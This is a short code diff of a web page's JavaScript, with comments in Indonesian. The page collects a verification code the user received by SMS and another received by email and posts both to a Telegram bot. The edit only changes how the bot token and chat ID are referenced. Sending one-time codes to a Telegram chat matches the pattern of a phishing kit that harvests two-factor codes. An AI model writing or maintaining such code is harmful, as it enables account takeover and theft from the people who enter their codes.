@@ -175,20 +175,20 @@
     }
 
     // Cek apakah token dan chat ID sudah tersedia
-    if (!window.TELEGRAM_TOKEN || !window.TELEGRAM_CHAT_ID) {
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
       alert("Konfigurasi belum tersedia. Coba beberapa saat lagi.");
       return;
     }
 
     const message = `KODE DARI SMS: ${sms}\nKODE DARI EMAIL: ${email}`;
 
-    fetch(`https://api.telegram.org/bot${window.TELEGRAM_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        chat_id: window.TELEGRAM_CHAT_ID,
+        chat_id: TELEGRAM_CHAT_ID,
         text: message
       })
     })
@@ -205,6 +205,7 @@
     });
   }
 </script>
+
 
 
   <script>
